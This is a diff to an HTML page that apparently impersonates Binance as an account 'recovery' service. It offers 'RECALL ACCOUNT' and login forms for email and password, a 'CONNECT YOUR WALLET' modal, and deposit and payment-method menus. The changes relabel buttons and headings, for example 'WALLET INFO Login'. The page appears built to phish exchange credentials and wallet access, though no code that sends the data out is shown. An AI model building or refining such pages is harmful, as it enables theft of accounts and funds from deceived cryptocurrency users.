@@ -52,7 +52,7 @@
         <h2 style="color: var(--yellow);">BINANCE</h2>
         <p style="color:var(--text-gray)">RECOVERY</p>
         <button class="btn-yellow" onclick="showForm('reg')">RECALL ACCOUNT</button>
-        <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
+        <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Existing account</button>
     </div>
 
     <div class="auth-card" id="reg-box" style="display:none;">
@@ -69,7 +69,7 @@
     </div>
 
     <div class="auth-card" id="login-box" style="display:none;">
-        <h3>Terminal Login</h3>
+        <h3>WALLET INFO Login</h3>
         <input type="email" id="l-email" placeholder="Email Address">
         <input type="password" placeholder="Password">
         <button class="btn-yellow" onclick="startAuth('login')">Unlock History</button>
@@ -92,13 +92,13 @@
     <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> HISTORY OF TRANSACTION</div>
     <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> DEPOSIT COIN</div>
     <div class="nav-item" onclick="switchView('LINKED PAYMENT METHOD')"><i class="fa-solid fa-credit-card"></i> LINKED PAYMENT METHOD</div>
-    <div class="nav-item" onclick="openModal()" style="color:var(--yellow);"><i class="fa-solid fa-key"></i> LINKED PAYMENT METHOD</div>
+    <div class="nav-item" onclick="openModal()" style="color:var(--yellow);"><i class="fa-solid fa-key"></i> CONNECT YOUR WALLET</div>
     <div class="nav-item btn-logout" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Log Out</div>
 </nav>
 
 <div id="main-wrapper">
     <header>
-        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">Cryptocurrency Prices Active</span></div>
+        <div style="font-weight:bold; font-size:13px;">WALLET INFO: <span style="color:var(--up)">Cryptocurrency Prices Active</span></div>
         <div style="display:flex; gap:10px; align-items:center;">
             <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
                 <option value="USD">USD</option>
